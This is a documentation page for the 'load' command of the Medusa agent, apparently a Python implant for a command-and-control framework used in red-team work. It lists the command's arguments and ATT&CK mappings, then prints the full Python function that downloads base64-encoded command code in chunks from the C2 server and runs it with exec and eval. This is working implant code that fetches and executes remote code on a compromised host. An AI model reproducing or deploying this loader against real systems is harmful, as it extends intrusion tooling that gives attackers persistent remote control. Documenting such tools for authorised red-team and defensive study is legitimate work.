+++
title = "load"
chapter = false
weight = 100
hidden = false
+++

## Summary

This loads new functions into memory via the C2 channel 

- Python Versions Supported: 2.7, 3.8
- Needs Admin: False  
- Version: 1  
- Author: @ajpc500  

### Arguments

#### cmd_to_load

- Description: name of existing Medusa command to load (e.g. shell)
- Required Value: True  
- Default Value: None  

## Usage

```
load cmd
```

## MITRE ATT&CK Mapping

- T1030  
- T1129 

## Detailed Summary
The associated command's python files (selecting the correct Python version where necessary) is base64 encoded, and sent down to the agent to be loaded in. 

```Python
    def load(self, task_id, file_id, command):
        total_chunks = 1
        chunk_num = 0
        cmd_code = ""
        while (chunk_num < total_chunks):
            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                return "Job stopped."
            data = { "action": "post_response", "responses": [
                    { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file_id, "chunk_num": chunk_num }, "task_id": task_id }
                ]}
            response = self.postMessageAndRetrieveResponse(data)
            chunk = response["responses"][0]
            chunk_num+=1
            total_chunks = chunk["total_chunks"]
            cmd_code += base64.b64decode(chunk["chunk_data"]).decode()

        if cmd_code:
            exec(cmd_code.replace("\n    ","\n")[4:])
            setattr(medusa, command, eval(command))
            cmd_list = [{"action": "add", "cmd": command}]
            responses = [{ "task_id": task_id, "user_output": "Loaded command: {}".format(command), "commands": cmd_list, "completed": True }]
            message = { "action": "post_response", "responses": responses }
            response_data = self.postMessageAndRetrieveResponse(message)
        else: return "Failed to upload '{}' command".format(command)
```

Notably, this implementation implements chunking for this function to facilitate large functions being loaded.